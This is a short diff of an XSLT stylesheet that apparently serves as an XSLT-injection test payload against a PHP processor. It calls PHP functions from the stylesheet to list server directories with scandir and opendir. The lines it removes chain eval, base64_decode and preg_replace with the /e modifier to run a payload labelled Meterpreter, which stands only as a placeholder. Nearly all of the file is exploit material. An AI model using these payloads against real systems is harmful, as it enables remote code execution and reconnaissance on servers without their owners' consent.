@@ -5,17 +5,12 @@
   <div style="background-color:teal;color:white;padding:4px">
     <span style="font-weight:bold">
     <xsl:variable name="fd" select="php:function('scandir', '.')" />
-    FD = <xsl:value-of select="$fd"/>
-    <xsl:variable name="eval">
-      eval(base64_decode('Base64-encoded Meterpreter code'))
-    </xsl:variable>
-    <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
-    <xsl:value-of select="$preg"/>
+    FD = <xsl:value-of select="php:functionString('opendir', '.')"/>
     </span>
   </div>
   <div style="margin-left:20px;margin-bottom:1em;font-size:10pt">
     <p>
-    TEST 1
+    TEST 2
     <span style="font-style:italic"> (<xsl:value-of select='prct'/> %) </span>
     </p>
   </div>
